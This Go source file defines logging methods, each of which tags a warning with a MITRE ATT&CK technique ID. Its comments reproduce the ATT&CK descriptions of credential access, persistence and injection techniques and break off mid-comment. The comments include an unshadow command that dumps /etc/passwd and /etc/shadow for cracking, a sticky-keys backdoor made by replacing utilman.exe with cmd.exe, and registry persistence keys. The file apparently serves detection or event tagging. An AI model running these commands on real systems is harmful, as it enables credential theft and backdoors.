package gctx



/* ATTACKEntetcpasswdandetcshadow Phases: credential-access

Adversaries may attempt to dump the contents of /etc/passwd and /etc/shadow to
enable offline password cracking. Most modern Linux operating systems use a
combination of /etc/passwd and /etc/shadow to store user account information
including password hashes in /etc/shadow. By default, /etc/shadow is only
readable by the root user.(Citation: Linux Password and Shadow File Formats) The
Linux utility, unshadow, can be used to combine the two files in a format suited
for password cracking utilities such as John the Ripper:(Citation: nixCraft -
John the Ripper) # /usr/bin/unshadow /etc/passwd /etc/shadow >
/tmp/crack.password.db
*/
func (g *Session) ATTACKEntetcpasswdandetcshadow(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1003.008").
        Msg("/etc/passwd and /etc/shadow")
}

/* ATTACKEntARPCachePoisoning Phases: credential-access collection

Adversaries may poison Address Resolution Protocol (ARP) caches to position
themselves between the communication of two or more networked devices. This
activity may be used to enable follow-on behaviors such as Network Sniffing or
Transmitted Data Manipulation. The ARP protocol is used to resolve IPv4
addresses to link layer addresses, such as a media access control (MAC)
address.(Citation: RFC826 ARP) Devices in a local network segment communicate
with each other by using link layer addresses. If a networked device does not
have the link layer address of a particular networked device, it may send out a
broadcast ARP request to the local network to translate the IP address to a MAC
address. The device with the associated IP address directly replies with its MAC
address. The networked device that made the ARP request will then use as well as
store that information in its ARP cache. An adversary may passively wait for an
ARP request to poison the ARP cache of the requesting device. The adversary may
reply with their MAC address, thus deceiving the victim by making them believe
that they are communicating with the intended networked device. For the
adversary to poison the ARP cache, their reply must be faster than the one made
by the legitimate IP address owner. Adversaries may also send a gratuitous ARP
reply that maliciously announces the ownership of a particular IP address to all
the devices in the local network segment. The ARP protocol is stateless and does
not require authentication. Therefore, devices may wrongly add or update the MAC
address of the IP address in their ARP cache.(Citation: Sans ARP Spoofing Aug
2003)(Citation: Cylance Cleaver) Adversaries may use ARP cache poisoning as a
means to man-in-the-middle (MiTM) network traffic. This activity may be used to
collect and/or relay data such as credentials, especially those sent over an
insecure, unencrypted protocol.(Citation: Sans ARP Spoofing Aug 2003)
*/
func (g *Session) ATTACKEntARPCachePoisoning(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1557.002").
        Msg("arp cache poisoning")
}

/* ATTACKEntASREPRoasting Phases: credential-access

Adversaries may reveal credentials of accounts that have disabled Kerberos
preauthentication by Password Cracking Kerberos messages.(Citation: Harmj0y
Roasting AS-REPs Jan 2017)  Preauthentication offers protection against offline
Password Cracking. When enabled, a user requesting access to a resource
initiates communication with the Domain Controller (DC) by sending an
Authentication Server Request (AS-REQ) message with a timestamp that is
encrypted with the hash of their password. If and only if the DC is able to
successfully decrypt the timestamp with the hash of the user’s password, it will
then send an Authentication Server Response (AS-REP) message that contains the
Ticket Granting Ticket (TGT) to the user. Part of the AS-REP message is signed
with the user’s password.(Citation: Microsoft Kerberos Preauth 2014) For each
account found without preauthentication, an adversary may send an AS-REQ message
without the encrypted timestamp and receive an AS-REP message with TGT data
which may be encrypted with an insecure algorithm such as RC4. The recovered
encrypted data may be vulnerable to offline Password Cracking attacks similarly
to Kerberoasting and expose plaintext credentials. (Citation: Harmj0y Roasting
AS-REPs Jan 2017)(Citation: Stealthbits Cracking AS-REP Roasting Jun 2019)  An
account registered to a domain, with or without special privileges, can be
abused to list all domain accounts that have preauthentication disabled by
utilizing Windows tools like PowerShell with an LDAP filter. Alternatively, the
adversary may send an AS-REQ message for each user. If the DC responds without
errors, the account does not require preauthentication and the AS-REP message
will already contain the encrypted data. (Citation: Harmj0y Roasting AS-REPs Jan
2017)(Citation: Stealthbits Cracking AS-REP Roasting Jun 2019) Cracked hashes
may enable Persistence, Privilege Escalation, and Lateral Movement via access to
Valid Accounts.(Citation: SANS Attacking Kerberos Nov 2014)
*/
func (g *Session) ATTACKEntASREPRoasting(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1558.004").
        Msg("as-rep roasting")
}

/* ATTACKEntAbuseElevationControlMechanism Phases: privilege-escalation defense-evasion

Adversaries may circumvent mechanisms designed to control elevate privileges to
gain higher-level permissions. Most modern systems contain native elevation
control mechanisms that are intended to limit privileges that a user can perform
on a machine. Authorization has to be granted to specific users in order to
perform tasks that can be considered of higher risk. An adversary can perform
several methods to take advantage of built-in control mechanisms in order to
escalate privileges on a system.
*/
func (g *Session) ATTACKEntAbuseElevationControlMechanism(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1548").
        Msg("abuse elevation control mechanism")
}

/* ATTACKEntAccessTokenManipulation Phases: defense-evasion privilege-escalation

Adversaries may modify access tokens to operate under a different user or system
security context to perform actions and bypass access controls. Windows uses
access tokens to determine the ownership of a running process. A user can
manipulate access tokens to make a running process appear as though it is the
child of a different process or belongs to someone other than the user that
started the process. When this occurs, the process also takes on the security
context associated with the new token. An adversary can use built-in Windows API
functions to copy access tokens from existing processes; this is known as token
stealing. These token can then be applied to an existing process (i.e. Token
Impersonation/Theft) or used to spawn a new process (i.e. Create Process with
Token). An adversary must already be in a privileged user context (i.e.
administrator) to steal a token. However, adversaries commonly use token
stealing to elevate their security context from the administrator level to the
SYSTEM level. An adversary can then use a token to authenticate to a remote
system as the account for that token if the account has appropriate permissions
on the remote system.(Citation: Pentestlab Token Manipulation) Any standard user
can use the runas command, and the Windows API functions, to create
impersonation tokens; it does not require access to an administrator account.
There are also other mechanisms, such as Active Directory fields, that can be
used to modify access tokens.
*/
func (g *Session) ATTACKEntAccessTokenManipulation(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1134").
        Msg("access token manipulation")
}

/* ATTACKEntAccessibilityFeatures Phases: privilege-escalation persistence

Adversaries may establish persistence and/or elevate privileges by executing
malicious content triggered by accessibility features. Windows contains
accessibility features that may be launched with a key combination before a user
has logged in (ex: when the user is on the Windows logon screen). An adversary
can modify the way these programs are launched to get a command prompt or
backdoor without logging in to the system. Two common accessibility programs are
C:\Windows\System32\sethc.exe, launched when the shift key is pressed five times
and C:\Windows\System32\utilman.exe, launched when the Windows + U key
combination is pressed. The sethc.exe program is often referred to as "sticky
keys", and has been used by adversaries for unauthenticated access through a
remote desktop login screen. (Citation: FireEye Hikit Rootkit) Depending on the
version of Windows, an adversary may take advantage of these features in
different ways. Common methods used by adversaries include replacing
accessibility feature binaries or pointers/references to these binaries in the
Registry. In newer versions of Windows, the replaced binary needs to be
digitally signed for x64 systems, the binary must reside in %systemdir%\, and it
must be protected by Windows File or Resource Protection (WFP/WRP). (Citation:
DEFCON2016 Sticky Keys) The Image File Execution Options Injection debugger
method was likely discovered as a potential workaround because it does not
require the corresponding accessibility feature binary to be replaced. For
simple binary replacement on Windows XP and later as well as and Windows Server
2003/R2 and later, for example, the program (e.g.,
C:\Windows\System32\utilman.exe) may be replaced with "cmd.exe" (or another
program that provides backdoor access). Subsequently, pressing the appropriate
key combination at the login screen while sitting at the keyboard or when
connected over Remote Desktop Protocol will cause the replaced file to be
executed with SYSTEM privileges. (Citation: Tilbury 2014) Other accessibility
features exist that may also be leveraged in a similar fashion: (Citation:
DEFCON2016 Sticky Keys)(Citation: Narrator Accessibility Abuse)  On-Screen
Keyboard: C:\Windows\System32\osk.exe Magnifier: C:\Windows\System32\Magnify.exe
Narrator: C:\Windows\System32\Narrator.exe Display Switcher:
C:\Windows\System32\DisplaySwitch.exe App Switcher:
C:\Windows\System32\AtBroker.exe
*/
func (g *Session) ATTACKEntAccessibilityFeatures(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1546.008").
        Msg("accessibility features")
}

/* ATTACKEntAccountAccessRemoval Phases: impact

Adversaries may interrupt availability of system and network resources by
inhibiting access to accounts utilized by legitimate users. Accounts may be
deleted, locked, or manipulated (ex: changed credentials) to remove access to
accounts. Adversaries may also subsequently log off and/or reboot boxes to set
malicious changes into place.(Citation: CarbonBlack LockerGoga 2019)(Citation:
Unit42 LockerGoga 2019)
*/
func (g *Session) ATTACKEntAccountAccessRemoval(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1531").
        Msg("account access removal")
}

/* ATTACKEntAccountDiscovery Phases: discovery

Adversaries may attempt to get a listing of accounts on a system or within an
environment. This information can help adversaries determine which accounts
exist to aid in follow-on behavior.
*/
func (g *Session) ATTACKEntAccountDiscovery(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1087").
        Msg("account discovery")
}

/* ATTACKEntAccountManipulation Phases: persistence

Adversaries may manipulate accounts to maintain access to victim systems.
Account manipulation may consist of any action that preserves adversary access
to a compromised account, such as modifying credentials or permission groups.
These actions could also include account activity designed to subvert security
policies, such as performing iterative password updates to bypass password
duration policies and preserve the life of compromised credentials. In order to
create or manipulate accounts, the adversary must already have sufficient
permissions on systems or the domain.
*/
func (g *Session) ATTACKEntAccountManipulation(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1098").
        Msg("account manipulation")
}

/* ATTACKEntAcquireInfrastructure Phases: resource-development

Adversaries may buy, lease, or rent infrastructure that can be used during
targeting. A wide variety of infrastructure exists for hosting and orchestrating
adversary operations. Infrastructure solutions include physical or cloud
servers, domains, and third-party web services.(Citation:
TrendmicroHideoutsLease) Additionally, botnets are available for rent or
purchase. Use of these infrastructure solutions allows an adversary to stage,
launch, and execute an operation. Solutions may help adversary operations blend
in with traffic that is seen as normal, such as contact to third-party web
services. Depending on the implementation, adversaries may use infrastructure
that makes it difficult to physically tie back to them as well as utilize
infrastructure that can be rapidly provisioned, modified, and shut down.
*/
func (g *Session) ATTACKEntAcquireInfrastructure(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1583").
        Msg("acquire infrastructure")
}

/* ATTACKEntActiveScanning Phases: reconnaissance

Adversaries may execute active reconnaissance scans to gather information that
can be used during targeting. Active scans are those where the adversary probes
victim infrastructure via network traffic, as opposed to other forms of
reconnaissance that do not involve direct interaction. Adversaries may perform
different forms of active scanning depending on what information they seek to
gather. These scans can also be performed in various ways, including using
native features of network protocols such as ICMP.(Citation: Botnet
Scan)(Citation: OWASP Fingerprinting) Information from these scans may reveal
opportunities for other forms of reconnaissance (ex: Search Open
Websites/Domains or Search Open Technical Databases), establishing operational
resources (ex: Develop Capabilities or Obtain Capabilities), and/or initial
access (ex: External Remote Services or Exploit Public-Facing Application).
*/
func (g *Session) ATTACKEntActiveScanning(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1595").
        Msg("active scanning")
}

/* ATTACKEntActiveSetup Phases: persistence privilege-escalation

Adversaries may achieve persistence by adding a Registry key to the Active Setup
of the local machine. Active Setup is a Windows mechanism that is used to
execute programs when a user logs in. The value stored in the Registry key will
be executed after a user logs into the computer.(Citation: Klein Active Setup
2010) These programs will be executed under the context of the user and will
have the account's associated permissions level. Adversaries may abuse Active
Setup by creating a key under  HKLM\SOFTWARE\Microsoft\Active Setup\Installed
Components\ and setting a malicious value for StubPath. This value will serve as
the program that will be executed when a user logs into the computer.(Citation:
Mandiant Glyer APT 2010)(Citation: Citizenlab Packrat 2015)(Citation: FireEye
CFR Watering Hole 2012)(Citation: SECURELIST Bright Star 2015)(Citation:
paloalto Tropic Trooper 2016) Adversaries can abuse these components to execute
malware, such as remote access tools, to maintain persistence through system
reboots. Adversaries may also use Masquerading to make the Registry entries look
as if they are associated with legitimate programs.
*/
func (g *Session) ATTACKEntActiveSetup(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1547.014").
        Msg("active setup")
}

/* ATTACKEntAddOffice365GlobalAdministratorRole Phases: persistence

An adversary may add the Global Administrator role to an adversary-controlled
account to maintain persistent access to an Office 365 tenant.(Citation:
Microsoft Support O365 Add Another Admin, October 2019)(Citation: Microsoft O365
Admin Roles) With sufficient permissions, a compromised account can gain almost
unlimited access to data and settings (including the ability to reset the
passwords of other admins) via the global admin role.(Citation: Microsoft O365
Admin Roles)  This account modification may immediately follow Create Account or
other malicious account activity.
*/
func (g *Session) ATTACKEntAddOffice365GlobalAdministratorRole(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1098.003").
        Msg("add office 365 global administrator role")
}

/* ATTACKEntAddins Phases: persistence

Adversaries may abuse Microsoft Office add-ins to obtain persistence on a
compromised system. Office add-ins can be used to add functionality to Office
programs. (Citation: Microsoft Office Add-ins) There are different types of add-
ins that can be used by the various Office products; including Word/Excel add-in
Libraries (WLL/XLL), VBA add-ins, Office Component Object Model (COM) add-ins,
automation add-ins, VBA Editor (VBE), Visual Studio Tools for Office (VSTO) add-
ins, and Outlook add-ins. (Citation: MRWLabs Office Persistence Add-
ins)(Citation: FireEye Mail CDS 2018) Add-ins can be used to obtain persistence
because they can be set to execute code when an Office application starts.
*/
func (g *Session) ATTACKEntAddins(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1137.006").
        Msg("add-ins")
}

/* ATTACKEntAdditionalCloudCredentials Phases: persistence

Adversaries may add adversary-controlled credentials to a cloud account to
maintain persistent access to victim accounts and instances within the
environment. Adversaries may add credentials for Service Principals and
Applications in addition to existing legitimate credentials in Azure
AD.(Citation: Microsoft SolarWinds Customer Guidance)(Citation: Blue Cloud of
Death)(Citation: Blue Cloud of Death Video) These credentials include both x509
keys and passwords.(Citation: Microsoft SolarWinds Customer Guidance) With
sufficient permissions, there are a variety of ways to add credentials including
the Azure Portal, Azure command line interface, and Azure or Az PowerShell
modules.(Citation: Demystifying Azure AD Service Principals) In infrastructure-
as-a-service (IaaS) environments, after gaining access through Cloud Accounts,
adversaries may generate or import their own SSH keys using either the
CreateKeyPair or ImportKeyPair API in AWS or the gcloud compute os-login ssh-
keys add command in GCP.(Citation: GCP SSH Key Add) This allows persistent
access to instances within the cloud environment without further usage of the
compromised cloud accounts.(Citation: Expel IO Evil in AWS)(Citation: Expel
Behind the Scenes)
*/
func (g *Session) ATTACKEntAdditionalCloudCredentials(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1098.001").
        Msg("additional cloud credentials")
}

/* ATTACKEntAppCertDLLs Phases: privilege-escalation persistence

Adversaries may establish persistence and/or elevate privileges by executing
malicious content triggered by AppCert DLLs loaded into processes. Dynamic-link
libraries (DLLs) that are specified in the AppCertDLLs Registry key under
HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\ are loaded
into every process that calls the ubiquitously used application programming
interface (API) functions CreateProcess, CreateProcessAsUser,
CreateProcessWithLoginW, CreateProcessWithTokenW, or WinExec. (Citation: Elastic
Process Injection July 2017) Similar to Process Injection, this value can be
abused to obtain elevated privileges by causing a malicious DLL to be loaded and
run in the context of separate processes on the computer. Malicious AppCert DLLs
may also provide persistence by continuously being triggered by API activity.
*/
func (g *Session) ATTACKEntAppCertDLLs(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1546.009").
        Msg("appcert dlls")
}

/* ATTACKEntAppInitDLLs Phases: privilege-escalation persistence

Adversaries may establish persistence and/or elevate privileges by executing
malicious content triggered by AppInit DLLs loaded into processes. Dynamic-link
libraries (DLLs) that are specified in the AppInit_DLLs value in the Registry
keys HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Windows or
HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows
NT\CurrentVersion\Windows are loaded by user32.dll into every process that loads
user32.dll. In practice this is nearly every program, since user32.dll is a very
common library. (Citation: Elastic Process Injection July 2017) Similar to
Process Injection, these values can be abused to obtain elevated privileges by
causing a malicious DLL to be loaded and run in the context of separate
processes on the computer. (Citation: AppInit Registry) Malicious AppInit DLLs
may also provide persistence by continuously being triggered by API activity.
The AppInit DLL functionality is disabled in Windows 8 and later versions when
secure boot is enabled. (Citation: AppInit Secure Boot)
*/
func (g *Session) ATTACKEntAppInitDLLs(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1546.010").
        Msg("appinit dlls")
}

/* ATTACKEntAppleScript Phases: execution

Adversaries may abuse AppleScript for execution. AppleScript is a macOS
scripting language designed to control applications and parts of the OS via
inter-application messages called AppleEvents.(Citation: Apple AppleScript)
These AppleEvent messages can be sent independently or easily scripted with
AppleScript. These events can locate open windows, send keystrokes, and interact
with almost any open application locally or remotely. Scripts can be run from
the command-line via osascript /path/to/script or osascript -e "script here".
Aside from the command line, scripts can be executed in numerous ways including
Mail rules, Calendar.app alarms, and Automator workflows. AppleScripts can also
be executed as plain text shell scripts by adding #!/usr/bin/osascript to the
start of the script file.(Citation: SentinelOne AppleScript) AppleScripts do not
need to call osascript to execute, however. They may be executed from within
mach-O binaries by using the macOS Native APIs NSAppleScript or OSAScript, both
of which execute code independent of the /usr/bin/osascript command line
utility. Adversaries may abuse AppleScript to execute various behaviors, such as
interacting with an open SSH connection, moving to remote machines, and even
presenting users with fake dialog boxes. These events cannot start applications
remotely (they can start them locally), but they can interact with applications
if they're already running remotely. On macOS 10.10 Yosemite and higher,
AppleScript has the ability to execute Native APIs, which otherwise would
require compilation and execution in a mach-O binary file format.(Citation:
SentinelOne macOS Red Team). Since this is a scripting language, it can be used
to launch more common techniques as well such as a reverse shell via
Python.(Citation: Macro Malware Targets Macs)
*/
func (g *Session) ATTACKEntAppleScript(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1059.002").
        Msg("applescript")
}

/* ATTACKEntApplicationAccessToken Phases: defense-evasion lateral-movement

Adversaries may use stolen application access tokens to bypass the typical
authentication process and access restricted accounts, information, or services
on remote systems. These tokens are typically stolen from users and used in lieu
of login credentials. Application access tokens are used to make authorized API
requests on behalf of a user and are commonly used as a way to access resources
in cloud-based applications and software-as-a-service (SaaS).(Citation: Auth0 -
Why You Should Always Use Access Tokens to Secure APIs Sept 2019) OAuth is one
commonly implemented framework that issues tokens to users for access to
systems. These frameworks are used collaboratively to verify the user and
determine what actions the user is allowed to perform. Once identity is
established, the token allows actions to be authorized, without passing the
actual credentials of the user. Therefore, compromise of the token can grant the
adversary access to resources of other sites through a malicious
application.(Citation: okta) For example, with a cloud-based email service once
an OAuth access token is granted to a malicious application, it can potentially
gain long-term access to features of the user account if a "refresh" token
enabling background access is awarded.(Citation: Microsoft Identity Platform
Access 2019) With an OAuth access token an adversary can use the user-granted
REST API to perform functions such as email searching and contact
enumeration.(Citation: Staaldraad Phishing with OAuth 2017) Compromised access
tokens may be used as an initial step in compromising other services. For
example, if a token grants access to a victim’s primary email, the adversary may
be able to extend access to all other services which the target subscribes by
triggering forgotten password routines. Direct API access through a token
negates the effectiveness of a second authentication factor and may be immune to
intuitive countermeasures like changing passwords. Access abuse over an API
channel can be difficult to detect even from the service provider end, as the
access can still align well with a legitimate workflow.
*/
func (g *Session) ATTACKEntApplicationAccessToken(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1550.001").
        Msg("application access token")
}

/* ATTACKEntApplicationExhaustionFlood Phases: impact

Adversaries may target resource intensive features of web applications to cause
a denial of service (DoS). Specific features in web applications may be highly
resource intensive. Repeated requests to those features may be able to exhaust
system resources and deny access to the application or the server itself.
(Citation: Arbor AnnualDoSreport Jan 2018)
*/
func (g *Session) ATTACKEntApplicationExhaustionFlood(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1499.003").
        Msg("application exhaustion flood")
}

/* ATTACKEntApplicationLayerProtocol Phases: command-and-control

Adversaries may communicate using application layer protocols to avoid
detection/network filtering by blending in with existing traffic. Commands to
the remote system, and often the results of those commands, will be embedded
within the protocol traffic between the client and server.  Adversaries may
utilize many different protocols, including those used for web browsing,
transferring files, electronic mail, or DNS. For connections that occur
internally within an enclave (such as those between a proxy or pivot node and
other nodes), commonly used protocols are SMB, SSH, or RDP.
*/
func (g *Session) ATTACKEntApplicationLayerProtocol(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1071").
        Msg("application layer protocol")
}

/* ATTACKEntApplicationShimming Phases: privilege-escalation persistence

Adversaries may establish persistence and/or elevate privileges by executing
malicious content triggered by application shims. The Microsoft Windows
Application Compatibility Infrastructure/Framework (Application Shim) was
created to allow for backward compatibility of software as the operating system
codebase changes over time. For example, the application shimming feature allows
developers to apply fixes to applications (without rewriting code) that were
created for Windows XP so that it will work with Windows 10. (Citation: Elastic
Process Injection July 2017) Within the framework, shims are created to act as a
buffer between the program (or more specifically, the Import Address Table) and
the Windows OS. When a program is executed, the shim cache is referenced to
determine if the program requires the use of the shim database (.sdb). If so,
the shim database uses hooking to redirect the code as necessary in order to
communicate with the OS.  A list of all shims currently installed by the default
Windows installer (sdbinst.exe) is kept in:  %WINDIR%\AppPatch\sysmain.sdb and
hklm\software\microsoft\windows nt\currentversion\appcompatflags\installedsdb
Custom databases are stored in:  %WINDIR%\AppPatch\custom &
%WINDIR%\AppPatch\AppPatch64\Custom and hklm\software\microsoft\windows
nt\currentversion\appcompatflags\custom  To keep shims secure, Windows designed
them to run in user mode so they cannot modify the kernel and you must have
administrator privileges to install a shim. However, certain shims can be used
to Bypass User Account Control (UAC and RedirectEXE), inject DLLs into processes
(InjectDLL), disable Data Execution Prevention (DisableNX) and Structure
Exception Handling (DisableSEH), and intercept memory addresses
(GetProcAddress). Utilizing these shims may allow an adversary to perform
several malicious acts such as elevate privileges, install backdoors, disable
defenses like Windows Defender, etc. (Citation: FireEye Application Shimming)
Shims can also be abused to establish persistence by continuously being invoked
by affected programs.
*/
func (g *Session) ATTACKEntApplicationShimming(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1546.011").
        Msg("application shimming")
}

/* ATTACKEntApplicationWindowDiscovery Phases: discovery

Adversaries may attempt to get a listing of open application windows. Window
listings could convey information about how the system is used or give context
to information collected by a keylogger.
*/
func (g *Session) ATTACKEntApplicationWindowDiscovery(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1010").
        Msg("application window discovery")
}

/* ATTACKEntApplicationorSystemExploitation Phases: impact

Adversaries may exploit software vulnerabilities that can cause an application
or system to crash and deny availability to users. (Citation: Sucuri BIND9
August 2015) Some systems may automatically restart critical applications and
services when crashes occur, but they can likely be re-exploited to cause a
persistent DoS condition.
*/
func (g *Session) ATTACKEntApplicationorSystemExploitation(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1499.004").
        Msg("application or system exploitation")
}

/* ATTACKEntArchiveCollectedData Phases: collection

An adversary may compress and/or encrypt data that is collected prior to
exfiltration. Compressing the data can help to obfuscate the collected data and
minimize the amount of data sent over the network. Encryption can be used to
hide information that is being exfiltrated from detection or make exfiltration
less conspicuous upon inspection by a defender. Both compression and encryption
are done prior to exfiltration, and can be performed using a utility, 3rd party
library, or custom method.
*/
func (g *Session) ATTACKEntArchiveCollectedData(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1560").
        Msg("archive collected data")
}

/* ATTACKEntArchiveviaCustomMethod Phases: collection

An adversary may compress or encrypt data that is collected prior to
exfiltration using a custom method. Adversaries may choose to use custom
archival methods, such as encryption with XOR or stream ciphers implemented with
no external library or utility references. Custom implementations of well-known
compression algorithms have also been used.(Citation: ESET Sednit Part 2)
*/
func (g *Session) ATTACKEntArchiveviaCustomMethod(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1560.003").
        Msg("archive via custom method")
}

/* ATTACKEntArchiveviaLibrary Phases: collection

An adversary may compress or encrypt data that is collected prior to
exfiltration using 3rd party libraries. Many libraries exist that can archive
data, including Python rarfile (Citation: PyPI RAR), libzip (Citation: libzip),
and zlib (Citation: Zlib Github). Most libraries include functionality to
encrypt and/or compress data. Some archival libraries are preinstalled on
systems, such as bzip2 on macOS and Linux, and zip on Windows. Note that the
libraries are different from the utilities. The libraries can be linked against
when compiling, while the utilities require spawning a subshell, or a similar
execution mechanism.
*/
func (g *Session) ATTACKEntArchiveviaLibrary(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1560.002").
        Msg("archive via library")
}

/* ATTACKEntArchiveviaUtility Phases: collection

An adversary may compress or encrypt data that is collected prior to
exfiltration using 3rd party utilities. Many utilities exist that can archive
data, including 7-Zip(Citation: 7zip Homepage), WinRAR(Citation: WinRAR
Homepage), and WinZip(Citation: WinZip Homepage). Most utilities include
functionality to encrypt and/or compress data. Some 3rd party utilities may be
preinstalled, such as tar on Linux and macOS or zip on Windows systems.
*/
func (g *Session) ATTACKEntArchiveviaUtility(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1560.001").
        Msg("archive via utility")
}

/* ATTACKEntAsymmetricCryptography Phases: command-and-control

Adversaries may employ a known asymmetric encryption algorithm to conceal
command and control traffic rather than relying on any inherent protections
provided by a communication protocol. Asymmetric cryptography, also known as
public key cryptography, uses a keypair per party: one public that can be freely
distributed, and one private. Due to how the keys are generated, the sender
encrypts data with the receiver’s public key and the receiver decrypts the data
with their private key. This ensures that only the intended recipient can read
the encrypted data. Common public key encryption algorithms include RSA and
ElGamal. For efficiency, many protocols (including SSL/TLS) use symmetric
cryptography once a connection is established, but use asymmetric cryptography
to establish or transmit a key. As such, these protocols are classified as
Asymmetric Cryptography.
*/
func (g *Session) ATTACKEntAsymmetricCryptography(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1573.002").
        Msg("asymmetric cryptography")
}

/* ATTACKEntAsynchronousProcedureCall Phases: defense-evasion privilege-escalation

Adversaries may inject malicious code into processes via the asynchronous
procedure call (APC) queue in order to evade process-based defenses as well as
possibly elevate privileges. APC injection is a method of executing arbitrary
code in the address space of a separate live process.  APC injection is commonly
performed by attaching malicious code to the APC Queue (Citation: Microsoft APC)
of a process's thread. Queued APC functions are executed when the thread enters
an alterable state.(Citation: Microsoft APC) A handle to an existing victim
process is first created with native Windows API calls such as OpenThread. At
this point QueueUserAPC can be used to invoke a function (such as LoadLibrayA
pointing to a malicious DLL).  A variation of APC injection, dubbed "Early Bird
injection", involves creating a suspended process in which malicious code can be
written and executed before the process' entry point (and potentially subsequent
anti-malware hooks) via an APC. (Citation: CyberBit Early Bird Apr 2018)
AtomBombing (Citation: ENSIL AtomBombing Oct 2016) is another variation that
utilizes APCs to invoke malicious code previously written to the global atom
table.(Citation: Microsoft Atom Table) Running code in the context of another
process may allow access to the process's memory, system/network resources, and
possibly elevated privileges. Execution via APC injection may also evade
detection from security products since the execution is masked under a
legitimate process.
*/
func (g *Session) ATTACKEntAsynchronousProcedureCall(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1055.004").
        Msg("asynchronous procedure call")
}

/* ATTACKEntAtLinux Phases: execution persistence privilege-escalation

Adversaries may abuse the at utility to perform task scheduling for initial or
recurring execution of malicious code. The at command within Linux operating
systems enables administrators to schedule tasks.(Citation: Kifarunix - Task
Scheduling in Linux) An adversary may use at in Linux environments to execute
programs at system startup or on a scheduled basis for persistence. at can also
be abused to conduct remote Execution as part of Lateral Movement and or to run
a process under the context of a specified account.
*/
func (g *Session) ATTACKEntAtLinux(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1053.001").
        Msg("at (linux)")
}

/* ATTACKEntAtWindows Phases: execution persistence privilege-escalation

Adversaries may abuse the at.exe utility to perform task scheduling for initial
or recurring execution of malicious code. The at utility exists as an executable
within Windows for scheduling tasks at a specified time and date. Using at
requires that the Task Scheduler service be running, and the user to be logged
on as a member of the local Administrators group.  An adversary may use at.exe
in Windows environments to execute programs at system startup or on a scheduled
basis for persistence. at can also be abused to conduct remote Execution as part
of Lateral Movement and or to run a process under the context of a specified
account (such as SYSTEM). Note: The at.exe command line utility has been
deprecated in current versions of Windows in favor of schtasks.
*/
func (g *Session) ATTACKEntAtWindows(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1053.002").
        Msg("at (windows)")
}

/* ATTACKEntAudioCapture Phases: collection

An adversary can leverage a computer's peripheral devices (e.g., microphones and
webcams) or applications (e.g., voice and video call services) to capture audio
recordings for the purpose of listening into sensitive conversations to gather
information. Malware or scripts may be used to interact with the devices through
an available API provided by the operating system or an application to capture
audio. Audio files may be written to disk and exfiltrated later.
*/
func (g *Session) ATTACKEntAudioCapture(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1123").
        Msg("audio capture")
}

/* ATTACKEntAuthenticationPackage Phases: persistence privilege-escalation

Adversaries may abuse authentication packages to execute DLLs when the system
boots. Windows authentication package DLLs are loaded by the Local Security
Authority (LSA) process at system start. They provide support for multiple logon
processes and multiple security protocols to the operating system. (Citation:
MSDN Authentication Packages) Adversaries can use the autostart mechanism
provided by LSA authentication packages for persistence by placing a reference
to a binary in the Windows Registry location
HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ with the key value of "Authentication
Packages"=<target binary>. The binary will then be executed by the system when
the authentication packages are loaded.
*/
func (g *Session) ATTACKEntAuthenticationPackage(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1547.002").
        Msg("authentication package")
}

/* ATTACKEntAutomatedCollection Phases: collection

Once established within a system or network, an adversary may use automated
techniques for collecting internal data. Methods for performing this technique
could include use of a Command and Scripting Interpreter to search for and copy
information fitting set criteria such as file type, location, or name at
specific time intervals. This functionality could also be built into remote
access tools.  This technique may incorporate use of other techniques such as
File and Directory Discovery and Lateral Tool Transfer to identify and move
files.
*/
func (g *Session) ATTACKEntAutomatedCollection(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1119").
        Msg("automated collection")
}

/* ATTACKEntAutomatedExfiltration Phases: exfiltration

Adversaries may exfiltrate data, such as sensitive documents, through the use of
automated processing after being gathered during Collection.  When automated
